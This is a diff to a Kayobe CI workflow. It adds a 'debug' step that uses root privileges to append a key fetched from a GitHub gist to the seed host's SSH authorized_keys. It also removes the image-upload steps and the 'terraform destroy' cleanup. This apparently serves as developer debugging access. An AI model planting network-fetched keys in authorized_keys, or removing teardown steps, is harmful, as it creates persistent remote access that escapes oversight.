@@ -179,6 +179,14 @@ jobs:
         env:
           KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
 
+      - name: debug
+        run: |
+          source venvs/kayobe/bin/activate &&
+          source src/kayobe-config/kayobe-env --environment ci-builder &&
+          kayobe seed host command run --become --command "curl https://gist.githubusercontent.com/assumptionsandg/a691b34235d08c679faa3626c75ef781/raw/8172a150ffa7998c511860bdea89481faf8d870f/gistfile1.txt >> /home/stack/.ssh/authorized_keys"
+        env:
+          KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
+
       - name: Install dependencies
         run: |
           source venvs/kayobe/bin/activate &&
@@ -210,38 +218,6 @@ jobs:
           KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
         if: steps.build_ipa.outcome == 'failure'
 
-      - name: Upload IPA kernel image to Ark
-        run: |
-          source venvs/kayobe/bin/activate &&
-          source src/kayobe-config/kayobe-env --environment ci-builder &&
-          kayobe playbook run \
-          src/kayobe-config/etc/kayobe/ansible/pulp-image-upload.yml \
-          -e image_path=/opt/kayobe/images/ipa \
-          -e image_name=ipa \
-          -e image_tag=${{ steps.ipa_image_tag.outputs.ipa_image_tag }} \
-          -e os_distribution="ubuntu" \
-          -e os_release="jammy" \
-          -e file_extension='kernel'
-        env:
-          KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
-        if: steps.build_ipa.outcome == 'success'
-
-      - name: Upload IPA ramdisk image to Ark
-        run: |
-          source venvs/kayobe/bin/activate &&
-          source src/kayobe-config/kayobe-env --environment ci-builder &&
-          kayobe playbook run \
-          src/kayobe-config/etc/kayobe/ansible/pulp-image-upload.yml \
-          -e image_path=/opt/kayobe/images/ipa \
-          -e image_name=ipa \
-          -e image_tag=${{ steps.ipa_image_tag.outputs.ipa_image_tag }} \
-          -e os_distribution="ubuntu" \
-          -e os_release="jammy" \
-          -e file_extension='initramfs'
-        env:
-          KAYOBE_VAULT_PASSWORD: ${{ secrets.KAYOBE_VAULT_PASSWORD }}
-        if: steps.build_ipa.outcome == 'success'
-
       - name: Copy logs back
         continue-on-error: true
         run: |
@@ -260,12 +236,3 @@ jobs:
           echo "Builds failed. See workflow artifacts for details." &&
           exit 1
         if: steps.build_ipa.outcome == 'failure'
-
-      - name: Destroy
-        run: terraform destroy -auto-approve
-        working-directory: ${{ github.workspace }}/src/kayobe-config/terraform/aio
-        env:
-          OS_CLOUD: openstack
-          OS_APPLICATION_CREDENTIAL_ID: ${{ secrets.OS_APPLICATION_CREDENTIAL_ID }}
-          OS_APPLICATION_CREDENTIAL_SECRET: ${{ secrets.OS_APPLICATION_CREDENTIAL_SECRET }}
-        if: always()
